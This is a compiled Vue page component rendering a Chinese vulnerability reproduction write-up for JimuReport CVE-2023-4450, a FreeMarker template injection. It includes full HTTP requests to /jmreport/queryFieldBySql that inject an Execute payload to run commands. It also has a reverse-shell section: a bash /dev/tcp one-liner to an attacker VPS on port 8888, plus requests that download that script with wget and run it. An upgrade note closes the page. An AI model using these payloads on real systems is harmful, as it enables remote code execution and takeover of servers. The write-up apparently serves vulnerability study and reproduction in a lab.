import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as s,c as d,a as e,b as t,d as a,e as l}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),u=e("p",null,"积木报表（JimuReport）是一个开源的数据可视化报表平台。在其1.6.0版本及以前，存在一个FreeMarker服务端模板注入（SSTI）漏洞，攻击者利用该漏洞可在服务器中执行任意命令。",-1),p=e("p",null,"参考链接：",-1),m={href:"https://github.com/advisories/GHSA-j8h5-8rrr-m6j9",target:"_blank",rel:"noopener noreferrer"},h={href:"https://whoopsunix.com/docs/java/named%20module/",target:"_blank",rel:"noopener noreferrer"},v=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>JimuReport version &lt;= 1.6.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个JimuReport 1.6.0演示服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待一段时间后，访问<code>http://your-ip:8085</code>即可看到报表首页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240506112810381.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下请求，即可在服务端注入FreeMarker模板<code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; \${ex(&quot;id&quot;)}</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jmreport/queryFieldBySql HTTP/1.1
Host: localhost:8085
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 100

{&quot;sql&quot;:&quot;select &#39;result:&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; \${ex(\\&quot;id\\&quot;)}&#39;&quot; }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可见，<code>id</code>命令已经成功被执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240506114636787.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>创建一个 <code>bs.sh</code> 并托管在 vps，内容如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;your-vps-ip&gt;/8888 0&gt;&amp;1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发包，下载 <code>bs.sh</code> 并执行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jmreport/queryFieldBySql HTTP/1.1
Host: your-ip:8085

{&quot;sql&quot;:&quot;select &#39;result:&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; \${ex(\\&quot;wget 127.0.0.1/bs.sh\\&quot;)}&#39;&quot; }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jmreport/queryFieldBySql HTTP/1.1
Host: your-ip:8085

{&quot;sql&quot;:&quot;select &#39;result:&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; \${ex(\\&quot;bash bs.sh\\&quot;)}&#39;&quot; }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>vps 监听 8888 端口：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240506115543868.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,21),g={href:"http://jimureport.com/doc/log",target:"_blank",rel:"noopener noreferrer"};function b(x,_){const i=r("ExternalLinkIcon");return s(),d("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",m,[t("https://github.com/advisories/GHSA-j8h5-8rrr-m6j9"),a(i)])]),e("li",null,[e("a",h,[t("https://whoopsunix.com/docs/java/named%20module/"),a(i)])])]),v,e("p",null,[t("升级到最新版本： "),e("a",g,[t("http://jimureport.com/doc/log"),a(i)])])])}const k=n(o,[["render",b],["__file","JimuReport FreeMarker 服务端模板注入命令执行 CVE-2023-4450.html.vue"]]);export{k as default};
